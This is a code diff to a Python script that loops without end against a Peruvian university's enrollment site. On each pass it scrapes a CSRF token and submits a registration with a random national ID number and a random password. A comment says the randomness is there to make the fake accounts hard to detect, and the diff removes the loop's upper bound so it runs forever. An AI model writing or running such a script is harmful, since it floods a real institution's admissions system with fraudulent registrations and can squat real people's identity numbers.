@@ -1,7 +1,7 @@
 from bs4 import BeautifulSoup
 import requests
 import random
-
+import time
 headers = {
     "Origin":"http://www.inscripciones.uni.edu.pe",
     "Upgrade-Insecure-Requests":1,
@@ -13,25 +13,29 @@ headers = {
     "Accept-Language":"es-ES,es;q=0.9,en;q=0.8"
 }
 
-with open("lastOne.txt","r") as f:
-    dni = int(f.read())
+"""with open("lastOne.txt","r") as f:
+    dni = int(f.read())"""
 
-while dni<=99999999 :
+while True :
     r = requests.get("http://www.inscripciones.uni.edu.pe/login");
     text = r.text
     soup = BeautifulSoup(text , features = "lxml").body
     token = soup.find_all('input')[0]['value']
-    dni_str = "7"+str(random.randint(1000000,9999999))
-    password = str(random.randint(100000,999999)) #Make difficult to find wich one is fake
+    dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru now have a ID starting with 7
+    password = str(random.randint(100000,999999)) # Making difficult to find wich one is fake
     data = {
         '_token':token,
         'dni': dni_str,
         'password': password,
         'password_confirmation': password
     }
-    r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
-    if dni%50==0:
-        print(str(dni_str)+":"+str(r.status_code))
-        with open("lastOne.txt","w") as f:
-            f.write(str(dni))
+    try:
+        r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
+    except ValueError:
+        print("Error: retrying http post")
+        time.sleep(3)
+    #if dni%50==0:
+    print(str(dni_str)+":"+ "Ok" if r.status_code==200 else "Error")
+    """with open("lastOne.txt","w") as f:
+            f.write(str(dni))"""
     #dni+=1
